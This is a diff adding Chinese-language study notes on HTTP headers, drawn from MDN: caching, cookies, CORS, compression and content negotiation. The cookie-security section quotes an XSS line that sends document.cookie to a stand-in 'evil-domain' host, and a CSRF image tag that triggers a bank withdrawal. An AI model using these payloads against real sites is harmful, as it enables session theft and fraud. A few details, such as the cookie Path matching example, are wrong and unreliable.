@@ -1,0 +1,396 @@
+#+title: HTTP Headers 学习笔记
+#+date: 2019-01-04
+#+index: HTTP Headers 学习笔记
+#+tags: HTTP
+#+begin_abstract
+大概两年前粗略地读过一下 *HTTP权威指南* 这本书(不知道名字有没有记错),当时读起来感觉好难懂,现在想起来感觉就像读 =Reference= 一样,不过书的确是好书,不过做为教程就有点过于厚重了.
+
+因为之前读 *HTTP权威指南* 的时候还有很多地方不太懂,所以最近打算要复习一下 =HTTP Headers= 的内容,正好发现 *MDN* 上面有这部分的教程,并且简单明了,于是打算针对这一块这个笔记.
+
+说个题外话, *MDN* 真是一个关于 *WEB* 开发的很好的文档库,我说的 *WEB* 开发并非只针对前端或者后端,而是前后端的总和, *MDN* 的教程相比那些厚重的书可谓是好太多了,简单易懂,而且还免费,这里衷心感谢 *Mozilla* 以及开源社区的各位.
+
+题外话二,最近怠惰了好多,这篇文章其实很早之前就开始写了,不过懒癌晚期导致最近才发出来,新的一年要做出一些改变, time to show your true Tenno power.
+#+end_abstract
+
+HTTP 的[[https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview][概览]]就不写了,自己看就好.后面也一样,详细的东西不会再赘述,我只会大概总结比较重要的东西.这里的内容我尽量会用 =Nginx= 的 =add_header= 指令来实践一下.
+
+*** 缓存 (Cache)
+
+缓存有不同类型(这里的缓存是指 =WEB= 的组成部分,并非储存的内容,自己结合上下文了解),可以分两大类: 私有(private)和公有(shared).私有就是只针对单个用户,比如浏览器自带的缓存;公有是对于多个用户的,公有缓存的目是储存可以复用的响应资源,比如代理缓存,网关缓存, =CDN=, 以及 =WEB= 服务器部署的反向代理缓存和负载均衡.
+
+并非所有东西都够被缓存(cached),通常限于 =GET= 响应,其它请求方法可能没有那么好,常见的可缓存对象有如下:
+
+1. 成功响应 (=GET= 请求的 =200= 响应)
+
+2. 永久重定向 (=301= 响应)
+
+3. 错误响应 (=404= 页面)
+
+4. 不完全响应 (=206= 响应)
+
+5. 除了 =GET= 以外适合用于作为缓存键(cache key)的响应,比如由不同键(secondary key)区分的多个缓存响应的组合
+
+缓存索引内容形式大概就是 =Key : Value=, =Value= 就是缓存的内容, =Key= 是 =请求方法 + 目标 URI= 这样的组合,当用同样的请求方法请求同样的 =URI= 的时候就会找到对应的缓存资源了.
+
+**** 缓存控制
+***** Cache-Control
+
+=HTTP/1.1= 的通用头,用来指定对于请求和响应的储存机制.
+
+- 完全不缓存任何内容,每次浏览器请求服务器的时候都会得到一个完整的请求
+
+  #+BEGIN_EXAMPLE
+  Cache-Control: no-store
+
+  或者
+
+  Cache-Control: no-cache, no-store, must-revalidate
+  #+END_EXAMPLE
+
+- 不让缓存服务器缓存资源,在服务器发放新的缓存副本之前,缓存服务器会给原本的服务器发送请求进行验证,
+
+  因为浏览器和服务器(也就是前面的原本的服务器)之间可能会有各种缓存(服务器),原本服务器更新了内容的话,中间缓存不一定会及时得到更新,为了确保是和原本服务器的内容一样就需要这么做了.
+
+  #+BEGIN_EXAMPLE
+  Cache-Control: no-cache
+  #+END_EXAMPLE
+
+- 设置公有或者私有缓存
+
+  #+BEGIN_EXAMPLE
+  Cache-Control: private
+
+  或者
+
+  Cache-Control: public
+  #+END_EXAMPLE
+
+- 设置缓存内容的生命周期为 =<seconds>= 秒
+
+  #+BEGIN_EXAMPLE
+  Cache-Control: max-age=<seconds>
+  #+END_EXAMPLE
+
+- 使用前必须验证缓存内容
+
+  #+BEGIN_EXAMPLE
+  Cache-Control: must-revalidate
+  #+END_EXAMPLE
+
+**** 新鲜度 (Freshness)
+
+新鲜度话题涉及浏览器,缓存(服务器)以及源服务器三个组成部分.
+
+#+CAPTION: 公有缓存的处理过程
+https://mdn.mozillademos.org/files/13771/HTTPStaleness.png
+
+新鲜度时间根据几个头来计算的,不同情况的计算方式不一样,
+
+1. 如果指定了 =Cache-control: max-age=N=,那么新鲜度时间为 =N= 秒
+
+2. 如果没有指定 =Cache-control: max-age=N=,那么检查 =Expires= 头,如果 =Expires= 头储存,那么它的值就减去 =Date= 头的值来得出新鲜度的时间.
+
+3. 如果 =Expires= 头也不存在,那么就检查 =Last-Modification= 头,如果这个头存在,那么新鲜度的时间为 =Date= 头的值减去 =Last-Modified= 头的值的十分之一.
+
+计算出新鲜度后就可以计算过期时间了: =接受到响应的时间点 + 新鲜度时间 - 当前缓存服务器资源的年龄=
+
+
+**** 资源版本修订
+
+给静态资源,比如 =CSS=, =JS= 这种文件的名字后面增加版本号,每次更新文件就修改版本号,这样可以(通过访问新的URI的方式)让静态资源马上得到更新.只需要开发人员开发的时候注意版本号,一般这工作都是交给自动构建工具完成的.
+
+
+**** 缓存验证
+
+(注意缓存资源处于缓存中).
+
+如果缓存的响应包含 =Cache-control: must-revalidate= 头,那么当浏览器重新访问该资源的时候就会对它进行验证(发送验证请求),检查是否过期.
+
+当缓存的文档到了过期时间,那么就会验证它或者刷新它,只有服务器提供了强验证器(strong validator)或者弱验证器(weak validator)的时候浏览器才会发验证请求.
+
+强验证器是指响应头对于 =user agent= 不透明的,也就是说 =user agent= 不知道这个头的值代表什么以及值是什么.弱验证器是因为它们的精确度准确到秒.
+
+强验证器有 =ETag=,弱验证器有 =Last-Modified=.
+
+如果资源的部分响应中含有 =ETag= 头,那么客户端可以在后续的请求中加入 =If-None-Match= 头来验证缓存的资源.
+
+如果响应中有 =Last-Modified= 头,那么客户端可以在后续的请求头中加入 =If-Modified-Since= 头来验证缓存的文档.
+
+当验证的请求发送后,服务器可以通过返回 =200 OK= 来无视验证请求,或者返回 =304 Not Modified= 来告诉浏览器可以继续使用缓存的备份.后者还可以更新缓存文档的过期时间.
+
+**** 区分响应 (Varying response)
+
+=Vary= =HTTP= 响应头判断如何匹配之后的请求来决定是否继续使用一个已缓存的响应而或者向服务器请求刷新.
+
+当缓存服务器收到一个请求,如果该请求带有一个 =Vary= 头,并且该 =Vary= 头与已缓存的响应的 =Vary= 一致就可以继续使用已缓存的资源,否则刷新资源.
+
+#+CAPTION: HTTP Vary 头
+https://mdn.mozillademos.org/files/13769/HTTPVary.png
+
+
+*** Cookies
+
+=Cookies= 的具体作用就不多说了,具体参考[[https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies][这里]]开头介绍.
+
+服务器通过 =Set-Cookie= 响应头给 =User Agent= 颁发 =cookies=, =User Agent= 通过 =Cookie= 请求头给服务器发送 =cookies= 用来验证.
+
+**** 会话cookies (Session Cookies)
+
+结果例子,服务器给客户端颁发了一个 =cookie=,
+
+响应头如下:
+
+#+BEGIN_EXAMPLE
+HTTP/2.0 200 OK
+Content-type: text/html
+Set-Cookie: yummy_cookie=choco
+Set-Cookie: tasty_cookie=strawberry
+
+[page content]
+#+END_EXAMPLE
+
+客户端再次请求服务器时候的请求头如下:
+
+#+BEGIN_EXAMPLE
+GET /sample_page.html HTTP/2.0
+Host: www.example.org
+Cookie: yummy_cookie=choco; tasty_cookie=strawberry
+#+END_EXAMPLE
+
+这种叫做会话 =cookies=,这种 =cookies= 不指定 =Expires= 或者 =Max-Age= 头,一旦客户端关闭就会删除这些 =cookies=.
+
+然而浏览器可以使用会话恢复(session restoring)功能,让大部份的会话 =cookies= 就好像没关闭过浏览器一样长期存在.
+
+
+
+**** 持久cookies (Permanent cookies)
+
+与会话 =cookies= 相反,持久 =cookies= 会在(通过 =Expires= 指令设置)特定日期或者(通过 =Max-Age= 指令设置)特定时间后过期.
+
+#+BEGIN_EXAMPLE
+Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
+#+END_EXAMPLE
+
+
+
+
+
+
+
+
+
+**** Secure和HttpOnly
+
+当 =cookies= 标记为 =Secure= 后,该 =cookie= 只能经过 =HTTPS= 协议加密后发送给服务器,即便如此也不要把重要信息储存在 =cookies= 中.
+
+为了防止跨站脚本(cross-site scripting OR XSS)攻击, =JavaScript= 的 =document.cookie API= 是不能访问设置了 =HttpOnly= 的 =cookies= 的.
+
+#+BEGIN_EXAMPLE
+Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
+#+END_EXAMPLE
+
+
+**** Cookies的作用域
+
+=Cookies= 通过 =Domain= 和 =Path= 两个指令指定 =cookies= 的作用域,也就是告诉客户端 =cookies= 要发送到哪里.
+
+=Domain= 指定可以接收 =cookies= 的服务器,如果没有指定,默认就是当前文档位置的服务器 (host of the current document location),不算它的子域;如果指定了,那么子域就包含进去.
+
+=Path= 指定可以发送到 =Domain= 下的特定路径,该路径必须要存在在请求的 =URL= 中.
+
+比如,如果 =Path=/docs=,那么以下路径也会被匹配:
+
+#+BEGIN_EXAMPLE
+/doc
+/doc/Web/
+/docs/Web/HTTP
+#+END_EXAMPLE
+
+
+
+**** 会话劫持和XSS(Session hijacking and XSS)以及跨站请求伪造(Cross-site request forgery)
+
+会话劫持就是通过社会工程学或者利用 =WEB= 的 =XSS= 漏洞来窃取 =cookie=,比如一个用户登录了一个网站,这个时候用户在这个页面点击了一个伪造的连接如:
+
+#+BEGIN_SRC javascript
+(new Image()).src = "http://www.evil-domain.com/steal-cookie?cookie=" + document.cookie;
+#+END_SRC
+
+=HttpOnly= 可以防止这种问题的发生.
+
+跨站请求伪造和 =XSS= 其实差不多,不过比起 =XSS= 直接偷 =cookie=,它是直接利用用户登录后的 =cookie= 直接调用一些接口,比如万年的银行转账例子:
+
+用户登录了银行帐号并且 =cookie= 还合法,然后点击了这个连接:
+
+#+BEGIN_SRC html
+<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
+#+END_SRC
+
+
+
+**** 跟踪和隐私
+
+***** 第三方 cookies (Third-party cookies)
+
+=Cookie= 是和域名关联的,如果 =cookie= 关联的域名和当前域名的域名一样,这种 =cookie= 就是第一方 =cookie= (first-party cookies),第一方 =cookie= 只会被发送到源服务器中.
+
+和第一方 =cookie= 相对,如果发送的服务器的域和 =cookie= 关联的域名不一样,那么这些 =cookies= 叫做第三方 =cookie= (third-party cookies).第三方 =cookie= 最常见的就是网页的广告,有第三方拓展可以禁止第三方 =cookie=.
+
+***** Do-Not-Track
+
+=DNT= 头告诉 =Web= 应用或者跨站用户不要跟踪某个用户.
+
+***** 僵尸cookies和删不掉的cookies (Zombie cookies and Evercookies)
+
+在删除之后马上被重新新建的 =cookies= 叫做僵尸 =cookies= 或者叫做删不掉的 =cookies=,这是通过 =Web storage API=, =Flash= 本地共享对象 (=Flash Local Shared Objects=) 以及其他技术来实现.
+
+
+*** 跨域资源共享 (CORS: Cross-Origin Resource Sharing)
+
+=CORS= 是一套机制: 通过使用额外的 =HTTP= 头告诉浏览器在某个域上运行的 =WEB= 应用拥有访问其它源上的某些(全部或者部分)资源.浏览器发送的这种请求叫做跨源请求(cross-origin HTTP request),只要域,协议和端口这三者中有一个不一样,那么就是不同源.
+
+出于安全原因,浏览器会限制脚本的跨源请求,比如 =XMLHttpRequest= 和 =Fetch API= 就是遵守同源策略(same-origin policy),也就是说这些 =APIs= 只能请求同一个源上的资源,除非其它源(服务器)的响应配置了正确的 =CORS= 头部.
+
+并非所有请求(request method)都会触发 =CORS preflighted (CORS 预测)=,(相对于简单请求)预测请求就是首先发送一个 =OPTIONS= 方法的请求,目的是为了知道资源的服务器支持哪些请求方法,然后再处理后续请求.不触发预测请求的请求叫做简单请求(simple requests).简单请求需要满足这些[[https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#Simple_requests][条件]],预测请求则需要满足这些[[https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#Preflighted_requests][条件]].
+
+#+CAPTION: 简单请求
+https://mdn.mozillademos.org/files/14293/simple_req.png
+
+#+CAPTION: 预测请求
+https://mdn.mozillademos.org/files/16401/preflight_.png
+
+其中:
+
+1. 请求中的 =Origin= 头表示发起请求的源;
+
+2. 响应中的 =Access-Control-Allow-Origin= 头表示允许发请求访问的源;
+
+3. 在预测请求中, =Access-Control-Request-Method= 头通知资源服务器接下来要发送实际请求的方法;
+
+4. 在预测请求中, =Access-Control-Request-Headers= 头通知资源服务器发送实际请求时候带的自定义头;
+
+5. 在预测响应中, =Access-Control-Allow-Methods= 头通知浏览器能发送的请求方法;
+
+6. 在预测响应中, =Access-Control-Allow-Headers= 头通知浏览器能发送的自定义头;
+
+7. 在预测响应中, =Access-Control-Max-Age= 指定了响应在下一个预测请求发送前能够缓存的时间.
+
+**** 跨源请求的凭证问题
+
+默认情况下,跨域 =XMLHttpRequest= 或者 =Fetch= 进行请求是不会发送凭证(=HTTP cookies= 和 =验证信息=)的.
+
+如果想要利用这些 =APIs= 进行带凭证的跨域请求,可以设置 =XMLHttpRequest= 对象的 =withCredentials= =flag= 或者构建 =Request= 对象时候设置 =credentials= 参数.
+
+如果服务器没有针对这些请求在响应中添加 =Access-Control-Allow-Credentials: true= 头,那么这个响应就会被浏览器无视.
+
+还有要注意的是,当服务器接受到带凭证的跨域请求的时候, =Access-Control-Allow-Origin= 头一定要指定特定的源,不能是 =*= 元字符,否则会失败,因为带凭证的跨域请求带有 =Cookie= 头,而 =*= 不能正确匹配.
+
+在 =CORS= 响应中设置的 =cookies= 叫做第三方 =cookie= (相关的参考 third-party cookie policies),如果用户把浏览器配置成不拒绝第三方 =cookies= 的话,第三方 =cookies= 就不会被保存.
+
+
+*** 压缩 (Compression)
+
+压缩可以提高网站的性能,节约带宽.现实中,开发开发者不需要实现压缩,浏览器和服务器早就好了,不过开发者要保证服务器配置正确.
+
+可以在三个层面上进行压缩:
+
+1. 文件格式
+
+文件相比文字占用的空间要大,如果文字的冗余程度多于 =60%=,那么换成文件的话就要占用更多的空间.文件压缩算法分两大类:无损压缩算法以及有损压缩算法.
+
+无损压缩算法(=Loss-less compression=)在解压和压缩过程中不修改要恢复的数据,复原前后的数据内容是一致的,比如 =gif= 和 =png= 格式的文件是采用无损压缩算法.
+
+有损压缩算法(=Lossy compression=)则在解压和压缩过程中对原始数据进行修改,修改的程度则是用户难以察觉,通常在线视频就是采用有损压缩算法, =jpeg= 格式的图片也是有损.
+
+也有一些文件格式可以采用两种算法,比如 =webp=,总体而言,有损压缩算法比无损压缩算法效率高.
+
+2. =HTTP= 层面上的加密算法
+
+这个层面上的叫做端到端压缩(end-to-end compression),具体做法就是服务器压缩资源,等待浏览器接收然后才解压,传输过程中不进行任何解压和压缩.
+
+这个过程采用内容协商机制(proactive content negotiation),浏览器发送 =Accept-Encoding= 首部,包含它所支持的压缩算法以及使用优先级,服务器选择其中一种,并且通过 =Content-Encoding= 首部告诉浏览器选择的哪一种.
+
+服务器必须发送一个包含 =Accept-Encoding= 的 =Vary= 头来对资源进行不同形式的缓存.
+
+#+CAPTION: 端到端的压缩过程
+[[https://mdn.mozillademos.org/files/13811/HTTPCompression1.png]]
+
+3. 节点之间的链路层面上的压缩
+
+逐跳压缩(Hop-by-hop compression),和端到端压缩类似,区别在于压缩发生在客户端与服务器中间的节点,不包括浏览器和服务器,比如缓存服务器,代理服务器等等.同样,这也需要进行内容协商.
+
+发送请求的接点需要发送 =TE= 头告诉响应节点支持哪种压缩算法,然后响应节点通过返回 =Transfer-Encoding= 头告诉请求节点选择了哪一种压缩算法.
+
+#+CAPTION: 逐跳的压缩过程
+[[https://mdn.mozillademos.org/files/13809/HTTPComp2.png]]
+
+
+*** 内容协商 (Content negotiation)
+
+对同一个 =URI= 提供不同的展现形式,例如文档使用的自然语言,编码形式,图片格式等等.客户端请求资源的时候,服务器会选择该资源的变种做为响应,服务器如何选择变种资源则是靠内容协商机制决定的.
+
+#+CAPTION: 内容协商机制
+[[https://mdn.mozillademos.org/files/13789/HTTPNego.png]]
+
+选择变种资源是通过以下两种方法其中一种:
+1. 客户端指定 =HTTP= 头,这种叫做服务器驱动或者主动协商(server-driven negotiation or proactive negotiation),是标准的协商方式.
+2. 服务器响应 =300= 或者 =406= 响应码,这种叫做代理驱动或者响应式协商(agent-driven negotiation or reactive negotiation),做为回滚机制使用.
+
+**** 服务器驱动协商
+这种方式定义了一套标准 =HTTP= 请求头来用于服务器驱动协商,除了标准头,还有一些别的头也能够用于内容协商.
+
+***** 标准头
+
+- Accept
+
+  声明用户代理能够处理的所有 =MIME= 类型,该头的值是一个列表,每种类型都通过一个逗号隔开.
+
+- Accept-CH
+
+  目前还处于实验阶段,告诉服务器用户代理的需要选择一个正确的响应.(不深入了解,目前只有 =Chrome 46+= 的浏览器实现了).
+
+- Accept-Charset
+
+  声明用户代理能够理解的字符编码.
+
+- Accept-CH-Lifetime
+
+  和 =Accept-CH= 类似,不做深入了解,目前只有 =Chrome 61+= 的浏览器实现了.
+
+- Accept-Encoding
+
+  声明用户代理所支持的内容压缩算法.
+
+- Accept-Language
+
+  声明用户的偏好语言.
+
+***** 非标准头
+
+- User-Agent
+
+  标识用户代理是什么浏览器,是一个字符串,内容一般如下,
+
+  #+BEGIN_EXAMPLE
+  USER-AGENT     :: PRODUCT-TOKEN + ("(" + COMMENT + ")")? + " " + USER-AGENT
+                 :: ""
+  PRODUCT-TOKENS :: name + "/" + version-number
+  COMMENT        :: free-string-without-any-parentheses
+  #+END_EXAMPLE
+
+  举个例子, =Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0=.
+
+  =COMMENT= 没有定义一个标准,一般来说就是上面这个例子的写法.
+
+- Vary
+
+  上面缓存中有写,就不说了.
+**** 代理驱动协商
+
+具体就不说了,了解[[https://developer.mozilla.org/en-US/docs/Web/HTTP/Content_negotiation#Agent-driven_negotiation][一下]]就好.
+
+
+*** 重定向 (Redirection)
+
+也叫做 =URL= 转发 (URL forwarding):访问某个 =URL= 的时候跳转到其它 URL, 有几个用途:当网站在维护的时候临时转发原来 =URL= 到能够访问的地方,以及当网站发生永久改变的时候保证旧的 =URL= 能够正常使用.
+
